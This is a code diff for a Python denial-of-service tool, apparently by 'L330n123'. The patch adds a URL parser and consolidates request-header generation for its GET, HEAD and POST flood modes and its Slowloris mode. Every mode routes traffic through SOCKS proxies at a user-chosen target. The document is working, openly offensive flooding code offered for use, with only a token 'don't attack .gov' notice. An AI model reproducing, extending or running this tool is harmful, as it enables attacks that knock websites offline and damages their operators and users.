@@ -26,14 +26,14 @@ print ('''
 	 CC/////  CC/////   | ddos tool |/ 
 	  CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 3.4 
+Python3 version 3.5 
 							C0d3d by L330n123
 ┌─────────────────────────────────────────────┐
 │        Tos: Don't attack .gov website       │
 ├─────────────────────────────────────────────┤
 │                 New stuff:                  │
+│          + Added Url Parser                 │
 |          + Added new socks4/5 api           |
-|          + Removed useless function         |
 │          + Customize Cookies                │
 │          + Customize data of post mode      │
 ├─────────────────────────────────────────────┤
@@ -138,13 +138,63 @@ def getuseragent():
 def randomurl():
 	 return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings) + Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))
 
+def GenReqHeader(method):
+	header = ""
+	if method == "get" or method == "head":
+		connection = "Connection: Keep-Alive\r\n"
+		if cookies != "":
+			connection += "Cookies: "+str(cookies)+"\r\n"
+		accept = Choice(acceptall)
+		referer = "Referer: "+Choice(referers)+ target + path + "\r\n"
+		useragent = "User-Agent: " + getuseragent() + "\r\n"
+		header =  referer + useragent + accept + connection + "\r\n"
+	elif method == "post":
+		post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
+		content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
+		refer = "Referer: http://"+ target + path + "\r\n"
+		user_agent = "User-Agent: " + getuseragent() + "\r\n"
+		accept = Choice(acceptall)
+		if mode2 != "y":
+			data = str(random._urandom(16)) # You can enable bring data in HTTP Header
+		length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
+		if cookies != "":
+			length += "Cookies: "+str(cookies)+"\r\n"
+		header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
+	return header
+
+def ParseUrl(original_url):
+	global target
+	global path
+	global port
+	global protocol
+	original_url = original_url.strip()
+	url = ""
+	path = "/"#default value
+	port = 80 #default value
+	protocol = "http"
+	#http(s)://www.example.com:1337/xxx
+	if original_url[:7] == "http://":
+		url = original_url[7:]
+	elif original_url[:8] == "https://":
+		url = original_url[8:]
+		protocol = "https"
+	#http(s)://www.example.com:1337/xxx ==> www.example.com:1337/xxx
+	#print(url) #for debug
+	tmp = url.split("/")
+	website = tmp[0]#www.example.com:1337/xxx ==> www.example.com:1337
+	check = website.split(":")
+	if len(check) != 1:#detect the port
+		port = int(check[1])
+	else:
+		if protocol == "https":
+			port = 443
+	target = check[0]
+	if len(tmp) > 1:
+		path = url.replace(website,"",1)#get the path www.example.com/xxx ==> /xxx
+
+
 def cc(event,socks_type):
-	connection = "Connection: Keep-Alive\r\n"
-	if cookies != "":
-		connection += "Cookies: "+str(cookies)+"\r\n"
-	accept = Choice(acceptall)
-	referer = "Referer: "+Choice(referers)+ ip + url2 + "\r\n"
-	useragent = "User-Agent: " + getuseragent() + "\r\n"
+	header = GenReqHeader("get")
 	proxy = Choice(proxies).strip().split(":")
 	event.wait()
 	while True:
@@ -156,15 +206,16 @@ def cc(event,socks_type):
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-			s.connect((str(ip), int(port)))
-			if port == 443:
+			s.connect((str(target), int(port)))
+			if protocol == "https":
 				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=ip)
+				s = ctx.wrap_socket(s,server_hostname=target)
 			try:
 				for _ in range(multiple):
-					get_host = "GET " + url2 + "?" + randomurl() + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-					request = get_host + referer + useragent + accept + connection +"\r\n"
+					get_host = "GET " + path + "?" + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+					request = get_host + header
 					s.send(str.encode(request))
+				s.close()
 			except:
 				s.close()
 			print ("[*] CC Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
@@ -172,12 +223,7 @@ def cc(event,socks_type):
 			s.close()
 
 def head(event,socks_type):#HEAD MODE
-	connection = "Connection: Keep-Alive\r\n"
-	if cookies != "":
-		connection += "Cookies: "+str(cookies)+"\r\n"
-	accept = Choice(acceptall)
-	referer = "Referer: "+Choice(referers)+ ip + url2 + "\r\n"
-	useragent = "User-Agent: " + getuseragent() + "\r\n"
+	header = GenReqHeader("head")
 	proxy = Choice(proxies).strip().split(":")
 	event.wait()
 	while True:
@@ -189,15 +235,16 @@ def head(event,socks_type):#HEAD MODE
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-			s.connect((str(ip), int(port)))
-			if port == 443:
+			s.connect((str(target), int(port)))
+			if protocol == "https":
 				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=ip)
+				s = ctx.wrap_socket(s,server_hostname=target)
 			try:
 				for _ in range(multiple):
-					head_host = "HEAD " + url2 + "?" + randomurl() + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-					request = head_host + referer + useragent + accept + connection +"\r\n"
+					head_host = "HEAD " + path + "?" + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+					request = head_host + header
 					s.send(str.encode(request))
+				s.close()
 			except:
 				s.close()
 			print ("[*] CC Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
@@ -206,17 +253,7 @@ def head(event,socks_type):#HEAD MODE
 
 def post(event,socks_type):
 	global data
-	post_host = "POST " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-	content = "Content-Type: application/x-www-form-urlencoded\r\n"
-	refer = "Referer: http://"+ ip + url2 + "\r\n"
-	user_agent = "User-Agent: " + getuseragent() + "\r\n"
-	accept = Choice(acceptall)
-	if mode2 != "y":
-		data = str(random._urandom(16)) # You can enable bring data in HTTP Header
-	length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
-	if cookies != "":
-		length += "Cookies: "+str(cookies)+"\r\n"
-	request = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
+	request = GenReqHeader("post")
 	proxy = Choice(proxies).strip().split(":")
 	event.wait()
 	while True:
@@ -228,13 +265,14 @@ def post(event,socks_type):
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-			s.connect((str(ip), int(port)))
+			s.connect((str(target), int(port)))
 			if str(port) == '443': # //AUTO Enable SSL MODE :)
 				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=ip)
+				s = ctx.wrap_socket(s,server_hostname=target)
 			try:
 				for _ in range(multiple):
 					s.sendall(str.encode(request))
+				s.close()
 			except:
 				s.close()
 			print ("[*] Post Flooding from  | "+str(proxy[0])+":"+str(proxy[1]))
@@ -252,10 +290,10 @@ def slow(conn,socks_type):
 			if socks_type == 5:
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			s.settimeout(1)
-			s.connect((str(ip), int(port)))
+			s.connect((str(target), int(port)))
 			if str(port) == '443':
 				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=ip)
+				s = ctx.wrap_socket(s,server_hostname=target)
 			s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
 			s.send("User-Agent: {}\r\n".format(getuseragent()).encode("utf-8"))
 			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
@@ -290,7 +328,7 @@ def slow(conn,socks_type):
 				if socks_type == 5:
 					s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 				s.settimeout(1)
-				s.connect((str(ip), int(port)))
+				s.connect((str(target), int(port)))
 				if int(port) == 443:
 					ctx = ssl.SSLContext()
 					s = ctx.wrap_socket(s,server_hostname=ip)
@@ -328,10 +366,10 @@ def checking(lines,socks_type,ms):#Proxy checker coded by Leeon123
 			if socks_type == 5:
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			s.settimeout(ms)
-			s.connect((str(ip), int(port)))
-			if port == 443:
+			s.connect((str(target), int(port)))
+			if protocol == "https":
 				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=ip)
+				s = ctx.wrap_socket(s,server_hostname=target)
 			s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
 			s.close()
 			break
@@ -465,9 +503,6 @@ def downloadsocks(choice):
 		print("> Have already downloaded socks5 list as socks5.txt")
 
 def main():
-	global ip
-	global url2
-	global port
 	global proxies
 	global multiple
 	global choice
@@ -475,8 +510,6 @@ def main():
 	global mode2
 	global cookies
 	global brute
-	ip = ""
-	port = ""
 	mode = ""
 	print("> Mode: [cc/post/head/slow/check]")
 	while mode == "" :
@@ -487,26 +520,8 @@ def main():
 			print("> Plese enter correct mode")
 			mode = ""
 			continue
-	ip = str(input("> Host/Ip:"))
-	if ip == "":
-		print("> Plese enter correct host or ip")
-		sys.exit(1)
-	if mode == "slow" or mode == "check":
-		pass
-	else:
-		url = str(input("> Page you want to attack(default=/):"))
-		if url == "":
-			url2 = "/"
-		else:
-			url2 = url
-	port = str(input("> Port(Https is 443):"))
-	if port == '':
-		port = int(80)
-		print("> Default choose port 80\r\n> Port 80 was chosen")
-	else:
-		port = int(port)
-		if str(port) == '443':
-			print("> [!] Enable SSL Mode")
+	url = str(input("> Input the target url:")).strip()
+	ParseUrl(url)
 	if mode == "post":
 		mode2 = str(input("> Customize post data? (y/n, default=n):")).strip()
 		if mode2 == "y":
